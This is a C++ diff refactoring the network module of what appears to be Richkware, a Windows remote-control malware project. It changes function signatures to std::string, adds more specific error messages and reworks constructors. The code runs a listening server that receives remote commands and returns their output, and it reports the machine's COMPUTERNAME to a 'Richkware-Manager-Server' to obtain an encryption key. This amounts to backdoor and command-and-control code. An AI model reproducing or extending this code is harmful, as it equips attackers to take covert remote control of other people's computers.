@@ -2,8 +2,8 @@
 *      Copyright 2016 Riccardo Melioli.
 */
 
+
 #include "network.h"
-#include "utils.h"
 
 Server::Server(std::string encryptionKeyArg) {
     encryptionKey = encryptionKeyArg;
@@ -26,31 +26,49 @@ Server &Server::operator=(const Server &server) {
     return *this;
 }
 
+// TODO verificare funzionamento del server
+//Network &Network::operator=(const Network &network) = default;
+
 Network &Network::operator=(const Network &network) {
     encryptionKey = network.encryptionKey;
+    serverAddress = network.serverAddress;
+    port = network.port;
+    associatedUser = network.associatedUser;
     server = network.server;
     return *this;
 }
 
-Network::Network(std::string encryptionKeyArg) {
+/*Network::Network(const std::string& encryptionKeyArg) {
+    encryptionKey = encryptionKeyArg;
+    server = Server(encryptionKeyArg);
+}*/
+
+Network::Network(const std::string &serverAddressArg, const std::string &portArg,
+                 const std::string &associatedUserArg,
+                 const std::string &encryptionKeyArg) {
+    serverAddress = serverAddressArg;
+    port = portArg;
+    associatedUser = associatedUserArg;
     encryptionKey = encryptionKeyArg;
     server = Server(encryptionKeyArg);
 }
 
-std::string Network::RawRequest(const char *serverAddress, const char *port, const char *request) {
+std::string Network::RawRequest(const std::string &serverAddress, const std::string &port, const std::string &request) {
     WSADATA wsaData;
     SOCKET ConnectSocket = INVALID_SOCKET;
     struct addrinfo *result = NULL, *ptr = NULL, hints;
-    const char *sendbuf = request;
+    const char *sendbuf = request.c_str();
     const int bufferlength = 512;
     char recvbuf[bufferlength];
     int iResult;
     std::string response;
 
+    // std::cout << "RawRequest:" << serverAddress << " " << port << " " << request << std::endl;
+
     // Initialize Winsock
     iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
     if (iResult != 0) {
-        return "Error";
+        return "Error: WSAStartup";
     }
 
     ZeroMemory(&hints, sizeof(hints));
@@ -59,10 +77,10 @@ std::string Network::RawRequest(const char *serverAddress, const char *port, con
     hints.ai_protocol = IPPROTO_TCP;
 
     // Resolve the server address and port
-    iResult = getaddrinfo(serverAddress, port, &hints, &result);
+    iResult = getaddrinfo(serverAddress.c_str(), port.c_str(), &hints, &result);
     if (iResult != 0) {
         WSACleanup();
-        return "Error";
+        return "Error: getaddrinfo";
     }
 
     // Attempt to connect to an address until one succeeds
@@ -73,7 +91,7 @@ std::string Network::RawRequest(const char *serverAddress, const char *port, con
                                ptr->ai_protocol);
         if (ConnectSocket == INVALID_SOCKET) {
             WSACleanup();
-            return "Error";
+            return "Error: socket";
         }
 
         // Connect to server.
@@ -89,7 +107,7 @@ std::string Network::RawRequest(const char *serverAddress, const char *port, con
     freeaddrinfo(result);
     if (ConnectSocket == INVALID_SOCKET) {
         WSACleanup();
-        return "Error";
+        return "Error: connect";
     }
 
     // Send an initial buffer
@@ -97,7 +115,7 @@ std::string Network::RawRequest(const char *serverAddress, const char *port, con
     if (iResult == SOCKET_ERROR) {
         closesocket(ConnectSocket);
         WSACleanup();
-        return "Error";
+        return "Error: send";
     }
 
     // Receive until the peer closes the connection
@@ -120,7 +138,7 @@ std::string Network::RawRequest(const char *serverAddress, const char *port, con
     if (iResult == SOCKET_ERROR) {
         closesocket(ConnectSocket);
         WSACleanup();
-        return "Error";
+        return "Error: shutdown";
     }
 
     // cleanup
@@ -131,8 +149,13 @@ std::string Network::RawRequest(const char *serverAddress, const char *port, con
 }
 
 
-bool Network::UploadInfoToRMS(const char *serverAddress, const char *port, const char *associatedUser) {
-    const char *serverPort = server.getPort();
+bool Network::UploadInfoToRMS() {
+    return UploadInfoToRMS(serverAddress, port, associatedUser, server.getPort(), encryptionKey);
+}
+
+bool
+Network::UploadInfoToRMS(const std::string &serverAddress, const std::string &port, const std::string &associatedUser,
+                         const std::string &serverPort, const std::string &encryptionKey) {
     Crypto crypto(encryptionKey);
 
     std::string name = getenv("COMPUTERNAME");
@@ -287,12 +310,17 @@ bool Network::uploadCommand(std::string commandsOutput, const char *serverAddres
 //    }
 }
 
-std::string Network::GetEncryptionKeyFromRMS(const char *serverAddress, const char *port, const char *associatedUser) {
+std::string Network::GetEncryptionKeyFromRMS() {
+    return GetEncryptionKeyFromRMS(serverAddress, port, associatedUser, encryptionKey);
+}
+
+std::string Network::GetEncryptionKeyFromRMS(const std::string &serverAddress, const std::string &port,
+                                             const std::string &associatedUser, const std::string &encryptionKey) {
     Crypto crypto(encryptionKey);
-    std::string key = "";
+    std::string key;
 
     // create a database entry into the Richkware-Manager-Server, to obtain the encryption key server-side generated
-    UploadInfoToRMS(serverAddress, port, associatedUser);
+    UploadInfoToRMS(serverAddress, port, associatedUser, "none", encryptionKey);
 
     // Primary key in RMS database.
     std::string name = getenv("COMPUTERNAME");
@@ -306,24 +334,24 @@ std::string Network::GetEncryptionKeyFromRMS(const char *serverAddress, const ch
                          "Connection: close\r\n" +
                          "\r\n";
 
-    key = RawRequest(serverAddress, port, packet.c_str());
+    key = RawRequest(serverAddress, port, packet);
     // If no matches were found, the function "find" returns string::npos
-    if(key.find('$') !=  std::string::npos) {
+    if (key.find('$') != std::string::npos) {
         key = key.substr(key.find('$') + 1, (key.find('#') - key.find('$')) - 1);
         key = crypto.Decrypt(key);
     }
-    //TODO server error: key not received
+
     return key;
 }
 
-const char *Network::ResolveAddress(const char *address) {
-    const char *addressIP = "";
+std::string Network::ResolveAddress(const std::string &address) {
+    std::string addressIP;
     WSADATA wsaData;
     struct hostent *remoteHost;
     char *host_name;
-    struct in_addr addr;
+    struct in_addr addr = {};
     WSAStartup(MAKEWORD(2, 2), &wsaData);
-    host_name = (char *) address;
+    host_name = (char *) address.c_str();
     remoteHost = gethostbyname(host_name);
     if (remoteHost != NULL) {
         if (remoteHost->h_addrtype == AF_INET) {
@@ -339,7 +367,7 @@ const char *Network::ResolveAddress(const char *address) {
 }
 
 
-void Server::Start(const char *portArg, bool encrypted) {
+void Server::Start(std::string portArg, bool encrypted) {
     DWORD dwThreadId;
     port = portArg;
 
@@ -369,7 +397,7 @@ void Server::Start(const char *portArg, bool encrypted) {
     hints.ai_flags = AI_PASSIVE;
 
     // Resolve the server address and port
-    iResult = getaddrinfo(NULL, portArg, &hints, &result);
+    iResult = getaddrinfo(NULL, portArg.c_str(), &hints, &result);
     if (iResult != 0) {
         WSACleanup();
         //throw 1;
@@ -425,7 +453,7 @@ HANDLE Server::getHhread() {
     return hThread;
 }
 
-const char *Server::getPort() {
+std::string Server::getPort() {
     return port;
 }
 
@@ -443,7 +471,7 @@ DWORD WINAPI ServerThread(void *arg) {
             WSACleanup();
             return 1;
         } else {
-            ClientSocketThreadArgs* csa = new ClientSocketThreadArgs();
+            ClientSocketThreadArgs *csa = new ClientSocketThreadArgs();
             csa->ClientSocket = ClientSocket;
             csa->encryptionKey = encryptionKey;
 
@@ -471,9 +499,9 @@ DWORD WINAPI ClientSocketThread(void *arg) {
     std::size_t posSubStr;
 
     // Receive until the peer shuts down the connection
-    if (encryptionKey.compare("") != 0){
+    if (encryptionKey.compare("") != 0) {
         send(ClientSocket, "\nEncrypted Connection Established\n", 34, 0);
-    }else{
+    } else {
         send(ClientSocket, "\nConnection Established\n", 24, 0);
     }
 
@@ -499,11 +527,11 @@ DWORD WINAPI ClientSocketThread(void *arg) {
             response = CommandsDispatcher(command);
 
             // string encryption
-            if (encryptionKey.compare("") != 0){
+            if (encryptionKey.compare("") != 0) {
                 std::string encResponse = (crypto.Encrypt(response) + "\n");
-                iSendResult = send(ClientSocket, encResponse.c_str(),encResponse.length(), 0);
-            } else{
-                iSendResult = send(ClientSocket, response.c_str(),response.length(), 0);
+                iSendResult = send(ClientSocket, encResponse.c_str(), encResponse.length(), 0);
+            } else {
+                iSendResult = send(ClientSocket, response.c_str(), response.length(), 0);
             }
 
 
